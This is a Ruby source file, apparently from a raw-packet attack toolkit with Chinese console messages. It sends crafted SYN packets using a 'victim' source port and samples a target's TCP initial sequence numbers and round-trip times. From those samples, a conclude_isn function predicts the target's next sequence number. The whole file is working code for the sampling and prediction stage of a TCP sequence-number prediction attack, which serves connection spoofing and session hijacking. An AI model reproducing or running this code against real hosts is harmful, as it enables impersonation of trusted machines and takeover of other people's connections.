require_relative '../../protocol/tcp_pac.rb'
class TCPP
	def self.syn_and_ack(pcap, scale=10)
		syn_pac = TCPP.syn_pac{|pac| 
			pac.tcph.src_port = CONFIG[:victim_port]
		}
		
		p s = arr_to_dot_dec(CONFIG[:dst_ip])

		pcap.setfilter("src host #{arr_to_dot_dec(CONFIG[:dst_ip])} and src port #{CONFIG[:dst_port]}")
		count = 0
		last_num = num_diff = 0
		last_time = Time.now
		ratios = []
		rtts = []
		seq_nums = []
		while count<scale
			send_time = Time.now
			print(color_blue("发包成功,时间："), send_time, "\n") if pcap.send_packet(syn_pac)
			
			pcap.loop do|this,pkt| #pcap.dispatch(:count=>10000) do |this,pkt|
			  puts color_red("第#{count}次接收数据包")
			  print color_green("网卡收到该包的时间："), pkt.time, "\n"
			  puts "差值：#{pkt.time-send_time}"
			  
			  tp = TCPP.build_pac_from_str(pkt.body)
			  print color_green("其tcp序列号："), tp.tcph.seq_num.to_i(2), "\n"
			  next if tp.tcph.seq_num.to_i(2) == last_num #丢弃重传的数据包

			  rtts << Time.now-send_time
			  time_diff = pkt.time - last_time
			  print color_green("与上一次接收时间的时间差（s）："), time_diff, "\n"
			  i=tp.tcph.seq_num.to_i(2)
			  num_diff = i - last_num
			  seq_nums << (last_num = i)
			  ratios << num_diff/time_diff
			  last_time = pkt.time

			  putc "\n"	

			  pcap.send_packet(TCPP.ack_for_pac(tp, syn_pac, "00010100"))
			  count += 1
			  break
			end	
			# sleep(3)
		end
		ratios.shift
		puts color_azure("初始序列号每秒增量样本")
		(scale-1).times do |i|
			puts "#{i}: #{ratios[i]}"
		end
		
		puts color_azure("往返时间样本")
		scale.times do |i|
			puts "#{i}: #{rtts[i]}"
		end

		puts color_azure("目标初始序列号样本"), "#{seq_nums}"

		[ratios,rtts,last_time,last_num]
	end

	def self.conclude_isn(last_num, increment, last_time, rtt)
		range = 2**32

		(last_num+(Time.now-last_time+rtt/2)*increment)%range
	end
end